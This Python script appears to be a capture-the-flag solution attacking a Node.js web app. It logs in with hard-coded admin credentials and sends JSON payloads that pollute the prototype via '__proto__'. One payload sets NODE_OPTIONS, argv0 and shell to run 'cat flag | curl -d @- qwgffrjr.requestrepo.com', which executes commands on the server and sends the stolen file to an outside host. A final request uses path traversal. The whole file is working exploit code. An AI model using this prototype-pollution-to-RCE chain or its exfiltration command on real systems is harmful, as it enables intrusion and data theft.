import requests
import time

cookie = ''
def getLoginCookie():
    # Define the login URL and payload
    login_url = 'http://34.142.163.254:63932/login'
    payload = {
        'username': 'Admin',
        'password': 'Admin@123'
    }

    # Create a session to persist cookies
    session = requests.Session()

    # Perform the login request
    response = session.post(login_url, data=payload, allow_redirects=False)

    # Check if the login was successful (you need to inspect the website's response)
    print(response.text)
    if "Found. Redirecting to /index.html" in response.text:
        print("Login success.")
        cookies = session.cookies.get_dict()
        return cookies['jwt']
    else:
        print("Login failed.")
        return None
    
def postToSaveEndpoint(thoughts, name, jwt_cookie):
    # Define the URL for the POST request
    url = 'http://34.142.163.254:63932/save'

    # Define the data to send in the request body
    data = {
        'thoughts': thoughts,
        'name': name
    }

    # Create headers with the JWT cookie
    headers = {
        'Cookie': f'jwt={jwt_cookie}'
    }

    try:
        # Make the POST request with a 2-second timeout and the JWT cookie in the headers
        requests.post(url, data=data, headers=headers, timeout=2)

        # Check the response status and content
    except requests.exceptions.Timeout:
        print("Save file success")

def getLogs(jwt_cookie, index1, index2):
    # Define the URL for the GET request to /logs
    url = f'http://34.142.163.254:63932/logs?q1={index1}&q2={index2}'

    # Create headers with the JWT cookie
    headers = {
        'Cookie': f'jwt={jwt_cookie}'
    }
    print(url)
    try:
        requests.get(url, headers=headers, timeout=2)
    except requests.exceptions.Timeout:
        print("GET request to /logs timed out after 2 seconds.")

def postToErrorLog(jwt_cookie,index1,index2):
    # Define the URL for the POST request
    url = f'http://34.142.163.254:63932/errorlog?q1={index1}&q2={index2}'

    headers = {
        'Cookie': f'jwt={jwt_cookie}'
    }

    try:
        # Make the POST request
        response = requests.post(url, headers=headers)

        # Check the response status and content
        if response.status_code == 200:
            print("POST request to /errorlog was successful.")
        else:
            print(f"POST request to /errorlog failed with status code {response.status_code}.")
    except requests.exceptions.Timeout:
        print("POST request to /errorlog timed out.")
        
def getLog(jwt_cookie, index1):
    # Define the URL for the GET request to /logs
    url = f'http://34.142.163.254:63932/log?q1={index1}'

    # Create headers with the JWT cookie
    headers = {
        'Cookie': f'jwt={jwt_cookie}'
    }
    print(url)
    try:
        response = requests.get(url, headers=headers, timeout=2)
        print(response.text)
    except requests.exceptions.Timeout:
        print("GET request to /log timed out after 2 seconds.")        


# Usage example
if __name__ == "__main__":
    cookie = getLoginCookie()
    print(cookie)
    postToSaveEndpoint('123', '{"xyz":"mbk","__proto__":{"local":true}}', cookie)
    postToSaveEndpoint('123', '{"bnm":"de160261"}', cookie)
    time.sleep(1)
    getLogs(cookie, 1, 2)
    time.sleep(1)
    postToSaveEndpoint('123', '{"bnm":"de160261","__proto__":{"NODE_OPTIONS":"--require /proc/self/cmdline","argv0":"console.log(require(\'child_process\').execSync(\'cat flag | curl -d @- qwgffrjr.requestrepo.com\').toString())//","shell":"/proc/self/exe"}}', cookie)
    time.sleep(1)
    getLogs(cookie, 3, 3)
    postToErrorLog(cookie, '/../../../../usr/local/lib/node_modules/npm/scripts/changelog', '3')

